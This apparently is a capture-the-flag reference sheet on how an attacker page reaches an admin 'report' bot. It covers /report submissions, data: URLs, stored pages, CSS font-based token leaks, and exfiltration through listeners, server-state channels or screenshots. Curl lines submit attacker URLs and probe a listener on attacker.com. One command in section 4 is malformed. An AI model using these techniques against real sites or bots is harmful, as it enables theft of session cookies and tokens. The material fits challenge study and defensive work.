# Delivery vectors — every path an attacker page takes to the bot

The complete delivery surface — each vector, its constraint, and the
channel it forces.

---

## 1. The /report endpoint — the canonical delivery

```bash
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
curl -X POST "$BASE/report" -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker/page"}'
curl -X POST "$BASE/report" --data-urlencode 'url=https://attacker/page'
```

```text
the bot opens the submitted URL — your page's JS runs on YOUR
origin (the classic shape) or doesn't run (the sealed shape).
```

## 2. The data: URL — a null-origin case

```bash
curl -X POST "$BASE/report" --data-urlencode \
  'url=data:text/html,<html><script>...</script></html>'
curl -X POST "$BASE/report" --data-urlencode \
  'url=data:text/html;base64,PGh0bWw+...'
```

```text
a data: URL — an opaque/null origin — the channel is a same-origin
leak or a server-state read.
```

## 3. The stored page — a same-origin case

```text
a stored page on the target's origin (a comment, a note, a profile
field) — the stored content's JS/CSS runs on the TARGET's origin —
a same-origin channel — the Lax cookie rides.
```

## 4. The fragment — a same-origin navigation

```bash
curl -X POST "$BASE/report" -d 'url=https://target/page#' + fragment
```

```text
a URL fragment the bot's page reads — a same-origin navigation to
a specific element/state.
```

## 5. The managed-policy bot — a forced sealed shape

```text
Chrome managed policy — URLBlocklist ['*'] + URLAllowlist — the bot
can ONLY visit the target's origin — NO attacker URL reaches it —
a declarative/server-state channel is the only one that works.
```

## 6. The airgapped bot — a server-state exfil

```text
a bot that can't reach attacker.com — the classic exfil (a listener)
fails — a server-state channel (a counter/recency/token), a
write-back, or a DOM-writeback is the only exfil.
```

## 7. The meta-refresh — a same-site navigation

```text
a meta-refresh issued BY THE TARGET is a same-site navigation — it
carries the Lax cookie — the sealed shape's privileged request is a
same-site navigation.
```

## 8. The same-origin CSS + privileged URL — the verified card

```text
a unicode-range leak recovers a token's char-set → a second
stylesheet's @font-face src is the SAME-ORIGIN privileged URL → the
bot's font load is the privileged GET that no external client could
fire — the channel that read the token becomes the channel that
spends it.
```

## 9. The multiple-visits case — a per-visit delivery

```text
a channel that carries N bits per visit needs the bot to visit N
times — each /report is a separate visit — the delivery's feasibility
is the visit-count × the bits-per-visit.
```

## 10. The single-visit case — a high-bandwidth channel

```text
a recency/LRU channel carries thousands of bits per visit — a single
/report suffices — the whole char-set leaks in one visit.
```

## 11. The incognito bot — a fresh-session case

```text
an incognito-context bot — a fresh session each visit — the flag
cookie is set per-visit — the leak reads under the flag-holder's
session.
```

## 12. The headed-vs-headless bot — the render surface

```text
a headless browser — still renders — the CSS/font/render channels
work. a JSDOM — no render — only the DOM/timing/count channels
survive.
```

## 13. The screenshotting bot — a DOM-writeback read

```text
a bot that screenshots the page — a DOM-writeback (the secret
rendered visibly) — the screenshot IS the exfil — no listener needed.
```

## 14. The per-vector delivery-selection

```text
a /report + a URL + JS runs          → the classic shape
a /report + a URL + JS blocked       → a declarative/server-state
a data: URL                          → a null-origin/same-origin case
a stored page                        → a same-origin case
a managed-policy bot                 → a declarative channel only
an airgapped bot                     → a server-state/write-back
a meta-refresh                       → a same-site navigation
a high-bandwidth channel             → a single visit
a low-bandwidth channel              → multiple visits
a screenshotting bot                 → a DOM-writeback read
an incognito bot                     → a fresh-session case
a JSDOM                              → a DOM/timing channel only
```

## 15. The delivery-check — the bot's reachability

```bash
# can the bot reach your listener
curl -sI "https://attacker.com/listener" || echo "airgapped — a server-state channel"
# does the bot carry the flag session
grep -rnoE 'setCookie|cookie.*flag|flag.*cookie' <src> | head -5
# does the bot render
grep -rnoiE 'puppeteer|playwright|selenium|headless|JSDOM' <src> | head -5
# is the bot's URL attacker-controlled
grep -rnoE 'goto|visit|url.*submit|report' <src> | head -5
```
